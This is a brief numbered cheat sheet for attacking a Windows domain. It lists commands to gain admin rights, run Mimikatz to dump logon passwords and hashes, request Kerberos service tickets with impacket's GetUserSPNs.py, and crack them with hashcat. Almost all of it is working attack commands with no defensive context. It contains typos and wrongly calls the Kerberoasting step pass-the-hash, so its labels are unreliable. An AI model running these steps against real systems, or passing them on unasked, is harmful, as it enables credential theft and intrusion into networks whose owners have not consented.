1. Obtain Adminpriveleges and install Mimikatz
2. Max out the access level: <code> privilege::debug </code>
3. Dump local credentials and hashes: <code> sekurlsa::logonPasswords </code>
4. Use pass the hash with GetUserSPNs from impacket: <code> pzthon3 GetUserSPNs.py -request -dc-ip 192.168.xxx.xxx FQDN/user  </code>
5. Crack the obtained SPN with hash cat:  <code> hashcat -m 13100 -a 0 spn.txt /usr/share/wordlists/sqlmap.txt  </code>
 
